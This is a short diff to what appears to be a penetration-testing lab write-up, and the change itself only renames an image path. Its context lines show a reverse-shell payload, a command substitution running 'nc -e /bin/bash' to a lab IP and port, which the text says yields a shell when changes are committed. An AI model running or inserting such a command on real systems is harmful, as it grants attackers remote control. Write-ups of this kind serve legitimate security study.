@@ -80,7 +80,7 @@ $(nc -e /bin/bash 192.168.45.182 4444)
 
 Afterwards, committing the changes would give us a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1) (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
